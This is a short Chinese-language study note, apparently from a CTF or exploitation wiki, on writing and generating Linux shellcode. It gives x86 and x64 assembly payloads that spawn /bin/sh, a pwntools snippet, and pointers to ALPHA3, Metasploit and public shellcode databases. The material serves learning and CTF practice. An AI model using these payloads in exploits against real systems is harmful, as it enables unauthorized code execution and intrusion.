# Shellcode

## 编写

```asm
# linux/x86 execve("/bin/sh", 0, 0)
global _start
_start:
    push "/sh"
    push "/bin"
    mov  ebx, esp ;; pathname = "/bin/sh"
    xor  edx, edx ;; argv = 0
    xor  ecx, ecx ;; envp = 0
    mov  al, 0xb  ;; execve
    int  0x80     ;; syscall
```

```asm
# linux/x86 execve("/bin/sh", 0, 0)
global _start
_start:
    xor  edx, edx ;; argv = 0
    xor  ecx, ecx ;; envp = 0
    push ecx
    push "/sh"
    push "/bin"
    mov  ebx, esp ;; pathname = "/bin/sh"
    mov  al, 0xb  ;; execve
    int  0x80     ;; syscall
```

```asm
# linux/x64 execve("/bin/sh", 0, 0)
global _start
_start:    
    mov  rbx, "/bin/sh"
    push rbx
    push rsp
    pop  rdi
    xor  esi, esi
    xor  edx, edx
    push 0x3b
    pop  rax
    syscall
```

- [Linux 系统调用](https://publicki.top/syscall.html)

## 生成

- 利用 [ALPHA3](https://github.com/TaQini/alpha3) 生成由可见字符集构成的 shellcode.
- 利用 [MSF](./Metasploit.md) 生成 shellcode.
- 利用 pwntools 生成特定架构和系统的 shellcode.

    ```py
    from pwn import*
    context(log_level = 'debug', arch = 'i386', os = 'linux') # linux/x86
    shellcode = asm(shellcraft.sh())
    ```

## 拓展

- [Exploit Database Shellcodes](https://www.exploit-db.com/shellcodes)
- <http://shell-storm.org/shellcode/>
